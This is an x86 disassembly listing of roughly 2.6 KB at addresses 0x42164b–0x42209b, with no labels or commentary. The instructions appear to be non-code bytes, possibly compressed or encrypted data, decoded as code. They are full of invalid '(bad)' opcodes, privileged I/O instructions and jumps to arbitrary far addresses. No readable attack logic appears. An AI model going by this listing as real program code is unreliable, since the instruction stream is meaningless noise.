  42164b:	dec    edi
  42164c:	add    al,0x8c
  42164e:	pusha  
  42164f:	and    dh,BYTE PTR [edx+0x73]
  421652:	call   0x326:0x6f50de8a
  421659:	jbe    0x421653
  42165b:	inc    ecx
  42165c:	and    eax,0x18d682c
  421661:	add    esp,DWORD PTR [eax+esi*1]
  421664:	stc    
  421665:	sub    al,0x1f
  421667:	xchg   ebx,eax
  421668:	pop    ebp
  421669:	mov    ah,0xb9
  42166b:	push   edx
  42166c:	adc    al,0xa6
  42166e:	and    dh,dh
  421670:	add    al,0xe5
  421672:	fs sub al,0xa0
  421675:	retf   
  421676:	out    dx,al
  421677:	mov    ebp,0xe3aac7de
  42167c:	hlt    
  42167d:	inc    eax
  42167e:	pop    ss
  42167f:	xchg   esi,eax
  421680:	push   cs
  421681:	sbb    cl,ah
  421683:	data16 adc ch,0x55
  421687:	call   0xf8334f59
  42168c:	pop    esi
  42168d:	sti    
  42168e:	mov    al,ds:0xc13bd709
  421693:	inc    ebx
  421694:	or     al,0xa9
  421696:	pop    ecx
  421697:	fisttp WORD PTR [ebx+0x191992cb]
  42169d:	(bad)  
  42169e:	cmp    al,0x82
  4216a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216a1:	loopne 0x4216c5
  4216a3:	scas   al,BYTE PTR es:[edi]
  4216a4:	mov    bh,0x6b
  4216a6:	mov    ds:0x4707a885,eax
  4216ab:	js     0x421729
  4216ad:	out    0x12,al
  4216af:	adc    bh,BYTE PTR [edi-0x4e0b2664]
  4216b5:	outs   dx,DWORD PTR ds:[esi]
  4216b6:	ret    
  4216b7:	xor    edi,ebx
  4216b9:	adc    DWORD PTR [esi-0x4fdada5b],ebx
  4216bf:	sbb    ecx,DWORD PTR [ebx-0x7cb8c0d9]
  4216c5:	sbb    bh,0x28
  4216c8:	ret    
  4216c9:	mov    DWORD PTR [esi],edx
  4216cb:	(bad)  
  4216cc:	jg     0x421661
  4216ce:	fst    QWORD PTR ds:0x9385001a
  4216d4:	or     dh,bl
  4216d6:	enter  0x76b3,0x3
  4216da:	mul    DWORD PTR [ebx]
  4216dc:	fs imul edx,esi,0xffffffb9
  4216e0:	dec    ebp
  4216e1:	xor    DWORD PTR [edi],esi
  4216e3:	rcr    al,cl
  4216e5:	idiv   DWORD PTR [edx+0x5d]
  4216e8:	inc    DWORD PTR [esp+edx*2+0x10]
  4216ec:	mov    dl,0xf4
	...
  421756:	stos   DWORD PTR es:[edi],eax
  421757:	sub    al,0xed
  421759:	stos   BYTE PTR es:[edi],al
  42175a:	out    dx,eax
  42175b:	jmp    0x42174c
  42175d:	sub    eax,0xa3418669
  421762:	call   0x167:0x67dd3f42
  421769:	add    BYTE PTR [eax],al
  42176b:	add    DWORD PTR [eax],eax
  42176d:	add    BYTE PTR ds:0xecb6e154,bl
  421773:	repz dec esp
  421775:	lds    ebx,FWORD PTR [eax+esi*2-0x38]
  421779:	imul   ebp,ebp,0x4b9a4997
  42177f:	icebp  
  421780:	je     0x4217f2
  421782:	sti    
  421783:	call   0x68a6:0x7e9010bc
  42178a:	rol    DWORD PTR es:[esi+0x7e0489e0],cl
  421791:	cmp    eax,0x790d9707
  421796:	(bad)
  421799:	jns    0x42172d
  42179b:	sub    DWORD PTR [eax-0x1e690919],edi
  4217a1:	stos   BYTE PTR es:[edi],al
  4217a2:	add    BYTE PTR [edi+ebx*1-0xd36b2c5],bh
  4217a9:	mov    eax,ds:0x63aa78d0
  4217ae:	and    BYTE PTR [ebx],0xba
  4217b1:	inc    ecx
  4217b2:	push   esi
  4217b3:	test   al,0x1a
  4217b5:	cmp    al,0x5f
  4217b7:	hlt    
  4217b8:	sbb    al,0x12
  4217ba:	inc    edi
  4217bb:	push   ebx
  4217bc:	jmp    0xa43a9ff
  4217c1:	or     esi,DWORD PTR [ecx]
  4217c3:	fs (bad) 
  4217c6:	jecxz  0x4217f8
  4217c8:	or     BYTE PTR [eax-0x376271ee],ah
  4217ce:	dec    eax
  4217cf:	in     al,0x8
  4217d1:	mov    al,0xe
  4217d3:	jo     0x4217b2
  4217d5:	(bad)  
  4217d6:	or     esp,DWORD PTR [eax+edx*8+0x7bc09935]
  4217dd:	adc    bl,bl
  4217df:	pop    ecx
  4217e0:	lahf   
  4217e1:	gs sahf 
  4217e3:	sbb    DWORD PTR [edi+ebp*2],eax
  4217e6:	dec    ebp
  4217e7:	sub    BYTE PTR [esi+0x46],bh
  4217ea:	stos   DWORD PTR es:[edi],eax
  4217eb:	add    DWORD PTR [eax+edx*2+0x14fdc5d2],0xffffffdd
  4217f3:	loope  0x421797
  4217f5:	and    bl,BYTE PTR [ebx+0x10]
  4217f8:	jnp    0x4217f8
  4217fa:	lods   eax,DWORD PTR ds:[esi]
  4217fb:	or     BYTE PTR ds:[ecx],cl
  4217fe:	or     esi,DWORD PTR [edi-0x1d]
  421801:	mov    ds:0x4688857f,eax
  421806:	or     al,0x8
  421808:	push   ebx
  421809:	inc    esi
  42180a:	ins    DWORD PTR es:[edi],dx
  42180b:	mov    bh,0x1f
  42180d:	and    bl,BYTE PTR [edx]
  42180f:	pushf  
  421810:	rcl    DWORD PTR [ebx],0x1f
  421813:	mov    ch,0xed
  421815:	sbb    ecx,DWORD PTR [ebx-0x27]
  421818:	rol    DWORD PTR [ecx],0xed
  42181b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42181c:	pop    edi
  42181d:	dec    edi
  42181e:	add    eax,0x5c5ba418
  421823:	jno    0x4217d1
  421825:	(bad)  [ebp+0x35]
  421828:	adc    al,0xb7
  42182a:	aas    
  42182b:	cmp    edi,DWORD PTR [ebp-0x7d]
  42182e:	pop    ebp
  42182f:	add    al,0x1a
  421831:	fsub   QWORD PTR [esi]
  421833:	jp     0x4217e0
  421835:	push   edx
  421836:	in     al,dx
  421837:	mov    al,0x9b
  421839:	xchg   ecx,eax
  42183a:	inc    edx
  42183b:	mov    ds:0x11511e88,eax
  421840:	js     0x4218a3
  421842:	shl    DWORD PTR [edx-0x2ec64a47],0xf8
  421849:	clc    
  42184a:	mov    al,ds:0x4f088798
  42184f:	mov    dh,0xcc
  421851:	sbb    BYTE PTR [ebp+0x59ba009c],ah
  421857:	test   edx,esp
  421859:	mov    ebp,0x864014a6
  42185e:	push   ecx
  42185f:	pushf  
  421860:	int3   
  421861:	test   BYTE PTR [edi],ch
  421863:	pop    esp
  421864:	cmp    BYTE PTR [edi-0x7],0x57
  421868:	ja     0x4218d3
  42186a:	fcmovbe st,st(6)
  42186c:	adc    BYTE PTR [ebx],dl
	...
  4218d6:	shl    DWORD PTR [eax-0x6061f47],1
  4218dc:	fnstenv [ecx-0x359a0174]
  4218e2:	sahf   
  4218e3:	adc    ebx,DWORD PTR [ecx]
  4218e5:	cmp    eax,0x16867
  4218ea:	add    BYTE PTR [ecx],al
  4218ec:	add    BYTE PTR [eax],al
  4218ee:	fnstsw WORD PTR [ebx]
  4218f0:	(bad)  
  4218f1:	pop    ss
  4218f2:	outs   dx,DWORD PTR ds:[esi]
  4218f3:	out    0x35,al
  4218f5:	sbb    esp,eax
  4218f7:	into   
  4218f8:	cli    
  4218f9:	clc    
  4218fa:	(bad)  
  4218fb:	sbb    BYTE PTR [edi-0x76d7c848],ch
  421901:	int3   
  421902:	les    ebx,FWORD PTR [edi-0x3e58cb6d]
  421908:	sar    BYTE PTR [edx+0x65],0x80
  42190c:	mov    ebx,0xb1eb178c
  421911:	inc    eax
  421912:	in     al,dx
  421913:	xlat   BYTE PTR ds:[ebx]
  421914:	sbb    DWORD PTR [edx+eiz*2-0x47],edx
  421918:	xor    edx,DWORD PTR [edx+0x2f43b9d4]
  42191e:	lahf   
  42191f:	fdiv   QWORD PTR [eax]
  421921:	adc    bh,BYTE PTR [ecx+ecx*4-0x29]
  421925:	sbb    bl,ah
  421927:	mov    al,ds:0xa7bd2133
  42192c:	lods   al,BYTE PTR ds:[esi]
  42192d:	test   al,0x94
  42192f:	mov    dl,0xc9
  421931:	call   0xaf5d:0xb7bfaa38
  421938:	retf   0xee00
  42193b:	loopne 0x421927
  42193d:	push   ds
  42193e:	sub    ebp,DWORD PTR [ecx]
  421940:	cmp    al,0x89
  421942:	xor    DWORD PTR [ebx],ebp
  421944:	mov    edx,0x605ffacb
  421949:	fisttp DWORD PTR [eax]
  42194b:	sbb    eax,0x2928ca36
  421950:	mov    dl,0xdc
  421952:	mov    eax,ds:0x49359d17
  421957:	add    DWORD PTR [eax-0x75f6c5ee],ebp
  42195d:	pop    ecx
  42195e:	int    0xe6
  421960:	mov    edi,0x5eeb0af6
  421965:	mov    dl,0xeb
  421967:	inc    esp
  421968:	xor    ebx,DWORD PTR [esi+0x1e2718cd]
  42196e:	inc    esp
  42196f:	jno    0x421906
  421971:	loop   0x4219c9
  421973:	add    DWORD PTR [edx],ebx
  421975:	stos   BYTE PTR es:[edi],al
  421976:	xchg   esi,eax
  421977:	aam    0x49
  421979:	and    ah,bl
  42197b:	cmp    esi,DWORD PTR [edx+0x62a6e31c]
  421981:	in     eax,dx
  421982:	iret   
  421983:	pop    ds
  421984:	inc    eax
  421985:	out    dx,eax
  421986:	adc    al,0xa3
  421988:	mov    al,ds:0xb0f3e958
  42198d:	(bad)  
  42198e:	xchg   esp,eax
  42198f:	jnp    0x4219f6
  421991:	sub    BYTE PTR [eax+0xf],ah
  421994:	ds jmp 0x4219a4
  421997:	jne    0x42192e
  421999:	hlt    
  42199a:	mov    esi,DWORD PTR [eax+0xd8874e6]
  4219a0:	mov    ebp,0x99cb208a
  4219a5:	fidiv  WORD PTR [edx-0x923cc0]
  4219ab:	mov    bl,BYTE PTR [esi]
  4219ad:	jge    0x421995
  4219af:	inc    edx
  4219b0:	shl    DWORD PTR [ecx+0x21],1
  4219b3:	aas    
  4219b4:	pop    ebp
  4219b5:	dec    eax
  4219b6:	xor    DWORD PTR [ebp+0x41aff50f],ebp
  4219bc:	into   
  4219bd:	popf   
  4219be:	sbb    ebx,eax
  4219c0:	push   ss
  4219c1:	xor    BYTE PTR [eax-0x73ddaf2a],al
  4219c7:	xchg   ebx,eax
  4219c8:	mov    fs,WORD PTR [edi-0x17b697c0]
  4219ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219cf:	sub    dl,0x61
  4219d2:	pop    ds
  4219d3:	test   edx,0x9b43cbc7
  4219d9:	test   al,0x77
  4219db:	out    0xb4,ax
  4219de:	mov    edi,0xbc3b3439
  4219e3:	retf   
  4219e4:	out    0x30,eax
  4219e6:	push   ebx
  4219e7:	jno    0x42197b
  4219e9:	mov    bl,0x9d
  4219eb:	mov    bl,0x94
  4219ed:	fadd   QWORD PTR [eax]
	...
  421a53:	add    BYTE PTR [eax],al
  421a55:	add    dh,bh
  421a57:	cld    
  421a58:	je     0x421a77
  421a5a:	jbe    0x4219f9
  421a5c:	(bad)  
  421a5d:	(bad)  
  421a5e:	jns    0x421a50
  421a60:	sbb    al,0x7b
  421a62:	fdivr  DWORD PTR [eax-0x6c]
  421a65:	and    esp,DWORD PTR [edi+0x69]
  421a68:	add    DWORD PTR [eax],eax
  421a6a:	add    BYTE PTR [ecx],al
  421a6c:	add    BYTE PTR [eax],al
  421a6e:	fcom   DWORD PTR [esi]
  421a70:	fcom   QWORD PTR [ecx-0x38922df8]
  421a76:	jle    0x421ad4
  421a78:	adc    BYTE PTR [edx+ecx*4+0x15],dl
  421a7c:	inc    esi
  421a7d:	inc    ebp
  421a7e:	sub    DWORD PTR [ebx-0x7714cb5f],esi
  421a84:	aaa    
  421a85:	in     al,0x75
  421a87:	loopne 0x421abc
  421a89:	ficom  WORD PTR [esi]
  421a8b:	jno    0x421a4b
  421a8d:	pop    ss
  421a8e:	(bad)  
  421a8f:	push   esp
  421a90:	out    0xca,al
  421a92:	nop
  421a93:	push   esp
  421a94:	test   eax,0xaffd0dc1
  421a99:	pushf  
  421a9a:	ret    
  421a9b:	stos   DWORD PTR es:[edi],eax
  421a9c:	test   eax,0x1377178a
  421aa1:	jo     0x421ab3
  421aa3:	imul   edx,DWORD PTR [esi],0xedc6036f
  421aa9:	cmp    dh,BYTE PTR [esi-0x21]
  421aac:	pushf  
  421aad:	dec    edi
  421aae:	jge    0x421ac0
  421ab0:	jmp    0x9e2d17b0
  421ab5:	loopne 0x421a60
  421ab7:	bndldx (bad),[esi+0x16]
  421abb:	popf   
  421abc:	test   DWORD PTR [edi+esi*1+0x3b33b6a8],0xd5a833fe
  421ac7:	retf   0x37e3
  421aca:	leave  
  421acb:	ja     0x421a7d
  421acd:	xchg   ebx,edi
  421acf:	outs   dx,DWORD PTR ds:[esi]
  421ad0:	sub    esi,edx
  421ad2:	enter  0x427,0x56
  421ad6:	or     BYTE PTR [ebp+0x24ea4434],dl
  421adc:	mov    ds:0x99a24915,al
  421ae1:	xchg   edi,eax
  421ae2:	pop    ebx
  421ae3:	lock mov ?,WORD PTR [edx-0x4a3b6cd0]
  421aea:	outs   dx,DWORD PTR ds:[esi]
  421aeb:	outs   dx,DWORD PTR ds:[esi]
  421aec:	ret    0xe5a4
  421aef:	scas   al,BYTE PTR es:[edi]
  421af0:	dec    esi
  421af1:	push   ecx
  421af2:	dec    ecx
  421af3:	rcr    DWORD PTR [edx],1
  421af5:	(bad)  
  421af6:	pop    esp
  421af7:	lahf   
  421af8:	mov    BYTE PTR gs:[esi-0x2f],ah
  421afc:	test   DWORD PTR [ecx+eax*2],0x881842f4
  421b03:	xchg   edi,eax
  421b04:	mov    dl,0x9e
  421b06:	mov    eax,ds:0xe8708448
  421b0b:	xchg   BYTE PTR [ebp-0x1b],cl
  421b0e:	cmc    
  421b0f:	lahf   
  421b10:	fwait
  421b11:	lds    ecx,FWORD PTR [edi]
  421b13:	xlat   BYTE PTR ds:[ebx]
  421b14:	sub    eax,0x89951748
  421b19:	aas    
  421b1a:	jmp    0x421aed
  421b1c:	xor    DWORD PTR [ecx],0x7bc661c0
  421b22:	push   ss
  421b23:	(bad)  
  421b24:	ret    
  421b25:	scas   al,BYTE PTR es:[edi]
  421b26:	mov    ah,0x7f
  421b28:	loop   0x421b31
  421b2a:	push   esi
  421b2b:	lock sub DWORD PTR [ebx-0x49],0x6a
  421b30:	push   ss
  421b31:	in     al,dx
  421b32:	push   cs
  421b33:	les    esp,FWORD PTR [ecx]
  421b35:	or     al,cl
  421b37:	push   ebp
  421b38:	adc    esi,DWORD PTR [edx+0x5f]
  421b3b:	repnz and dl,BYTE PTR [ecx+ebp*4+0x54141ca7]
  421b43:	pop    ebx
  421b44:	and    eax,0x7ee4062e
  421b49:	mov    dl,0xb
  421b4b:	dec    ebx
  421b4c:	in     eax,dx
  421b4d:	pushf  
  421b4e:	jnp    0x421b77
  421b50:	(bad)  
  421b51:	mov    dh,0x31
  421b53:	bound  ebp,QWORD PTR ds:0x6f83d7c0
  421b59:	xchg   DWORD PTR [ebx+0x6a],edi
  421b5c:	jecxz  0x421b3d
  421b5e:	in     eax,dx
  421b5f:	stos   DWORD PTR es:[edi],eax
  421b60:	push   ds
  421b61:	pushf  
  421b62:	sti    
  421b63:	cwde   
  421b64:	jmp    FWORD PTR [eax+edx*4-0x54]
  421b68:	push   edi
  421b69:	in     eax,0x5a
  421b6b:	dec    ecx
  421b6c:	cmp    al,0x69
	...
  421bd6:	push   ss
  421bd7:	cdq    
  421bd8:	jmp    0x37400baa
  421bdd:	fild   DWORD PTR [ecx+eax*8+0x28]
  421be1:	or     bl,BYTE PTR [ebx+0x6747b953]
  421be7:	push   0x1
  421be9:	add    BYTE PTR [eax],al
  421beb:	add    DWORD PTR [eax],eax
  421bed:	add    ah,cl
  421bef:	jnp    0x421c16
  421bf1:	inc    edi
  421bf2:	sahf   
  421bf3:	(bad)  
  421bf4:	(bad)  
  421bf5:	mov    ds:0xa5a9f569,al
  421bfa:	pop    esi
  421bfb:	not    DWORD PTR [edi]
  421bfd:	aaa    
  421bfe:	add    BYTE PTR [esi-0x729f0edb],ch
  421c04:	mov    esi,0xac4aa76a
  421c09:	cld    
  421c0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c0b:	clc    
  421c0c:	pop    edx
  421c0d:	xchg   edx,eax
  421c0e:	adc    eax,0x9c299e8
  421c13:	push   ebx
  421c14:	(bad)  
  421c15:	jecxz  0x421bfb
  421c17:	sbb    BYTE PTR [edi+ebx*4+0x5a],dh
  421c1b:	int3   
  421c1c:	outs   dx,BYTE PTR ds:[esi]
  421c1d:	std    
  421c1e:	xchg   ecx,eax
  421c1f:	jl     0x421c27
  421c21:	hlt    
  421c22:	dec    ebp
  421c23:	aad    0xc
  421c25:	icebp  
  421c26:	retf   
  421c27:	stc    
  421c28:	sub    al,cl
  421c2a:	and    esp,ebp
  421c2c:	lahf   
  421c2d:	ror    DWORD PTR [esi+0x25],0x5b
  421c31:	mov    eax,ds:0x53ae5d83
  421c36:	loope  0x421c05
  421c38:	xor    eax,0x813a113
  421c3d:	xor    BYTE PTR [ebp+0x1f3ace0e],dl
  421c43:	fmul   QWORD PTR [esi]
  421c45:	cmc    
  421c46:	into   
  421c47:	push   ecx
  421c48:	out    dx,eax
  421c49:	lods   eax,DWORD PTR ds:[esi]
  421c4a:	push   eax
  421c4b:	adc    al,0x76
  421c4d:	dec    ebx
  421c4e:	bnd je 0x421c06
  421c51:	or     esi,edx
  421c53:	shl    DWORD PTR [ebp+eax*8-0x26febed9],cl
  421c5a:	mov    ss,WORD PTR [edi-0x13876b38]
  421c60:	xor    ebx,ebx
  421c62:	and    bh,BYTE PTR [edx]
  421c64:	and    BYTE PTR [ebp+0x7167b459],cl
  421c6a:	pop    esp
  421c6b:	jp     0x421c83
  421c6d:	sub    BYTE PTR [ecx+0x79dd92f6],ch
  421c73:	or     al,0x14
  421c75:	xlat   BYTE PTR ds:[ebx]
  421c76:	imul   esp,DWORD PTR [ecx+ebp*2],0xffffffba
  421c7a:	jns    0x421cf9
  421c7c:	fdiv   st(3),st
  421c7e:	fstp   DWORD PTR [edx]
  421c80:	jge    0x421c5e
  421c82:	jo     0x421c83
  421c84:	jecxz  0x421ca8
  421c86:	clc    
  421c87:	in     eax,0xe7
  421c89:	jmp    0x693f8f5
  421c8e:	cwde   
  421c8f:	pop    esp
  421c90:	sub    al,0xdb
  421c92:	adc    cl,BYTE PTR [edx+0x514312b1]
  421c98:	ins    DWORD PTR es:[edi],dx
  421c99:	(bad)
  421c9e:	sbb    ecx,DWORD PTR [ecx+ecx*4]
  421ca1:	test   edx,0xc6542575
  421ca7:	inc    ecx
  421ca8:	mov    ds:0x1246b0f7,eax
  421cad:	into   
  421cae:	dec    ebp
  421caf:	push   ecx
  421cb0:	mov    ds:0x20c9624,eax
  421cb5:	jno    0x421c3f
  421cb7:	jno    0x421c66
  421cb9:	rcl    ebp,0x12
  421cbc:	inc    edi
  421cbd:	hlt    
  421cbe:	shr    edx,0xab
  421cc1:	mov    ds:0xd1e6b6b4,al
  421cc6:	sbb    eax,0x8571960d
  421ccb:	sbb    eax,ecx
  421ccd:	push   0x20
  421ccf:	in     al,0xa
  421cd1:	and    DWORD PTR [eax],ebx
  421cd3:	(bad)  
  421cd4:	(bad)  
  421cd5:	addr16 ret 0xa0a8
  421cd9:	(bad)  
  421cda:	bound  edi,QWORD PTR [ecx-0xc4e72e6]
  421ce0:	repz call 0x8609e4f5
  421ce6:	call   0xa8f6adfc
  421ceb:	inc    esi
  421cec:	cmc    
  421ced:	jmp    0x0:0x0
	...
  421d54:	add    BYTE PTR [eax],al
  421d56:	mov    al,0x6b
  421d58:	mov    ch,0xe5
  421d5a:	(bad)  
  421d5b:	push   eax
  421d5d:	jg     0x421db3
  421d5f:	dec    edi
  421d60:	xchg   edx,eax
  421d61:	dec    edi
  421d62:	mov    bh,0x3e
  421d64:	mov    bh,0x2b
  421d66:	imul   eax,DWORD PTR [bx+di],0x0
  421d6a:	add    BYTE PTR [ecx],al
  421d6c:	add    BYTE PTR [eax],al
  421d6e:	adc    BYTE PTR [esi-0x5ea2252e],bh
  421d74:	test   BYTE PTR ds:0x148c0e12,dh
  421d7a:	mov    WORD PTR [ebp+0x5abbca74],?
  421d80:	fsub   DWORD PTR [edx-0x46]
  421d83:	icebp  
  421d84:	imul   esp,DWORD PTR [ebp+0x7955af9b],0xcbcfc447
  421d8e:	mov    ch,0xd8
  421d90:	adc    al,ah
  421d92:	mov    bl,0x31
  421d94:	pop    esp
  421d95:	xchg   ebp,eax
  421d96:	adc    eax,0x54bded6d
  421d9b:	jb     0x421e0e
  421d9d:	sbb    dl,dl
  421d9f:	aaa    
  421da0:	pop    es
  421da1:	mov    ds:0x1426877,al
  421da6:	nop
  421da7:	mov    BYTE PTR [edi-0x6db0d5b8],dl
  421dad:	aas    
  421dae:	scas   eax,DWORD PTR es:[edi]
  421daf:	js     0x421d41
  421db1:	mov    dh,0xc3
  421db3:	inc    eax
  421db4:	test   eax,0x4deabe25
  421db9:	pop    ebx
  421dba:	stos   DWORD PTR es:[edi],eax
  421dbb:	daa    
  421dbc:	mov    edi,0xb69beccf
  421dc1:	(bad)  
  421dc2:	call   0x2187:0x6ff048a9
  421dc9:	pushf  
  421dca:	push   ds
  421dcb:	sbb    DWORD PTR [eax+0xf],eax
  421dce:	cmp    al,0x4f
  421dd0:	(bad)  
  421dd1:	shl    DWORD PTR [eax+0x64292dfc],cl
  421dd7:	jge    0x421d60
  421dd9:	and    esi,edi
  421ddb:	ins    BYTE PTR es:[edi],dx
  421ddc:	arpl   WORD PTR [eax+ebx*2],si
  421ddf:	enter  0x8c0,0x8c
  421de3:	or     eax,edx
  421de5:	xchg   ecx,eax
  421de6:	sub    eax,edx
  421de8:	pop    edi
  421de9:	mov    eax,ds:0xf04ece3c
  421dee:	add    ebx,esp
  421df0:	push   ss
  421df1:	xchg   BYTE PTR [edx+0x50522ac7],dh
  421df7:	sub    al,0x4c
  421df9:	hlt    
  421dfa:	mov    ch,0x7d
  421dfc:	pusha  
  421dfd:	or     dh,BYTE PTR [ecx+0x6e]
  421e00:	ja     0x421e76
  421e02:	hlt    
  421e03:	jmp    0x4ffe:0x7cfd7211
  421e0a:	xchg   esi,eax
  421e0b:	and    al,0x4c
  421e0d:	mov    ch,0x56
  421e0f:	scas   eax,DWORD PTR es:[edi]
  421e10:	js     0x421dd0
  421e12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e13:	ror    ebx,cl
  421e15:	fbld   TBYTE PTR [edi-0x4208f77a]
  421e1b:	mov    BYTE PTR [esi-0x40cb9c51],bh
  421e21:	fs xchg edi,eax
  421e23:	iret   
  421e24:	stc    
  421e25:	xchg   BYTE PTR [eax-0x1c],bh
  421e28:	mov    ds:0x94e3d0e4,al
  421e2d:	push   esi
  421e2e:	das    
  421e2f:	inc    ebx
  421e30:	push   es
  421e31:	push   ebp
  421e32:	jno    0x421de0
  421e34:	out    0x86,eax
  421e36:	dec    esi
  421e37:	mov    al,ds:0xa70dc0a9
  421e3c:	sbb    al,0x1c
  421e3e:	or     BYTE PTR [edx-0x4273a91f],0x41
  421e45:	fild   QWORD PTR [ebx+0x7b]
  421e48:	and    cl,BYTE PTR [ebp+0x22]
  421e4b:	or     eax,0x455f310c
  421e50:	test   BYTE PTR [ebp+0x2d1aa15f],0x4a
  421e57:	outs   dx,DWORD PTR ds:[esi]
  421e58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e59:	mov    ?,WORD PTR [edi]
  421e5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e5c:	push   esi
  421e5d:	xchg   esi,eax
  421e5e:	scas   al,BYTE PTR es:[edi]
  421e5f:	scas   al,BYTE PTR es:[edi]
  421e60:	(bad)  
  421e61:	jg     0x421e3f
  421e63:	xchg   ecx,eax
  421e64:	test   al,0x16
  421e66:	xor    eax,0x54b94da5
  421e6b:	or     eax,0xa0d5
	...
  421ed4:	add    BYTE PTR [eax],al
  421ed6:	iret   
  421ed7:	mov    eax,ds:0xbf7f851b
  421edc:	fucomip st,st(3)
  421ede:	push   es
  421edf:	ins    BYTE PTR es:[edi],dx
  421ee0:	xor    al,0xb9
  421ee2:	fmul   DWORD PTR [edi-0x57]
  421ee5:	adc    esp,DWORD PTR [edi+0x6c]
  421ee8:	add    DWORD PTR [eax],eax
  421eea:	add    BYTE PTR [ecx],al
  421eec:	add    BYTE PTR [eax],al
  421eee:	fwait
  421eef:	sbb    DWORD PTR [edi+0x65],ebx
  421ef2:	bound  esp,QWORD PTR [edx-0x16]
  421ef5:	cli    
  421ef6:	push   esp
  421ef7:	mov    ds:0x9e6e4cb4,al
  421efc:	fisttp WORD PTR [edi-0x4a]
  421eff:	adc    DWORD PTR [edx],edi
  421f01:	leave  
  421f02:	mov    cl,0xec
  421f04:	and    BYTE PTR [edx+ecx*2],ah
  421f07:	fidiv  DWORD PTR [ebx-0x7283d1bf]
  421f0d:	pop    ds
  421f0e:	add    ch,BYTE PTR [eax+0x3]
  421f11:	lahf   
  421f12:	mov    esi,0x13889756
  421f18:	push   esp
  421f19:	lods   eax,DWORD PTR ds:[esi]
  421f1a:	cmp    edi,edi
  421f1c:	aaa    
  421f1d:	sti    
  421f1e:	daa    
  421f1f:	or     ebx,DWORD PTR [edx]
  421f21:	jecxz  0x421f74
  421f23:	dec    ch
  421f25:	push   ebp
  421f26:	or     dh,BYTE PTR ds:0x1bf744a0
  421f2c:	dec    ebx
  421f2d:	std    
  421f2e:	cmp    eax,0xd1de3482
  421f33:	cmp    DWORD PTR [eax],ebp
  421f35:	pop    edx
  421f37:	push   cs
  421f38:	inc    esi
  421f39:	add    eax,ebx
  421f3b:	shr    dl,1
  421f3d:	dec    edi
  421f3e:	adc    ecx,ebx
  421f40:	mov    ss,WORD PTR [ebx-0x73]
  421f43:	in     al,dx
  421f44:	in     eax,dx
  421f45:	les    edx,FWORD PTR [eax+0x1e]
  421f48:	popf   
  421f49:	fimul  DWORD PTR [edi]
  421f4b:	loop   0x421fb3
  421f4d:	or     BYTE PTR [esi],al
  421f4f:	ret    0x259
  421f52:	jp     0x421f40
  421f54:	(bad)  [edx]
  421f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f57:	fld    TBYTE PTR [ecx-0x64fa4667]
  421f5d:	mov    al,ch
  421f5f:	sub    DWORD PTR [esi],ecx
  421f61:	out    dx,al
  421f62:	adc    ah,BYTE PTR [ebp+0x61eae294]
  421f68:	ficom  WORD PTR [ebx-0x2]
  421f6b:	mov    al,ds:0xb08cff49
  421f70:	fstp   DWORD PTR [eax+edi*1]
  421f73:	jne    0x421f66
  421f75:	ins    BYTE PTR es:[edi],dx
  421f76:	inc    eax
  421f77:	adc    BYTE PTR [ecx+0x78f721b4],bl
  421f7d:	data16 sti 
  421f7f:	push   eax
  421f80:	aas    
  421f81:	jno    0x421ff1
  421f83:	sub    DWORD PTR [ecx+0x1d2ef34b],edi
  421f89:	jns    0x421fec
  421f8b:	jo     0x421f27
  421f8d:	add    DWORD PTR [eax+0x4],0xc34847b8
  421f94:	das    
  421f95:	mov    bh,0x2
  421f97:	fdiv   st,st(1)
  421f99:	sti    
  421f9a:	shl    edx,0x9d
  421f9d:	out    0xcd,eax
  421f9f:	sahf   
  421fa0:	xor    cl,BYTE PTR [ecx+esi*1-0x4e8adf4b]
  421fa7:	js     0x421ffc
  421fa9:	xlat   BYTE PTR ds:[ebx]
  421faa:	repnz inc esi
  421fac:	leave  
  421fad:	push   es
  421fae:	test   eax,0xe13e6354
  421fb3:	sar    esi,0xb0
  421fb6:	jbe    0x421f62
  421fb8:	les    esi,FWORD PTR [esi+0x5a07df32]
  421fbe:	cmp    DWORD PTR [edx+ebp*4],esi
  421fc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fc2:	aam    0xb4
  421fc4:	sbb    ch,BYTE PTR [ebp+ebp*1-0xe]
  421fc8:	mov    ebp,0x9715b227
  421fcd:	push   edi
  421fce:	bound  eax,QWORD PTR [ebx+0x35]
  421fd1:	nop
  421fd2:	jno    0x42201b
  421fd4:	inc    eax
  421fd5:	or     BYTE PTR [edi+0x78],bh
  421fd8:	rcl    DWORD PTR [ebx],1
  421fda:	pop    ebp
  421fdb:	loop   0x421f6a
  421fdd:	jns    0x422050
  421fdf:	mov    al,0x58
  421fe1:	out    0x21,eax
  421fe3:	leave  
  421fe4:	inc    esi
  421fe5:	sub    eax,DWORD PTR [ebx+esi*2-0x1d]
  421fe9:	cmp    eax,0xbc40e876
	...
  422056:	imul   eax,DWORD PTR [esi],0xffffff8f
  422059:	dec    edi
  42205a:	out    dx,eax
  42205b:	iret   
  42205c:	jmp    0x422084
  42205e:	aas    
  42205f:	in     eax,dx
  422060:	push   es
  422061:	popw   ss
  422063:	jecxz  0x4220bc
  422065:	jp     0x4220ce
  422067:	ins    DWORD PTR es:[edi],dx
  422068:	add    DWORD PTR [eax],eax
  42206a:	add    BYTE PTR [ecx],al
  42206c:	add    BYTE PTR [eax],al
  42206e:	gs add eax,0x82a1d02f
  422074:	into   
  422075:	lods   eax,DWORD PTR ds:[esi]
  422076:	adc    eax,0xbc3ff808
  42207b:	sub    DWORD PTR [ebx-0x62],esp
  42207e:	leave  
  42207f:	into   
  422080:	fiadd  DWORD PTR cs:[edi]
  422083:	push   es
  422084:	jl     0x4220bd
  422086:	test   BYTE PTR [ecx+0x40980c9a],ch
  42208c:	pushf  
  42208d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42208e:	(bad)  
  42208f:	dec    eax
  422090:	fidiv  DWORD PTR [edx-0x31e6022d]
  422096:	cmp    ecx,DWORD PTR [edi]
  422098:	in     eax,dx
  422099:	and    bh,BYTE PTR [esi]
  42209b:	xchg   DWORD PTR [eax],esi
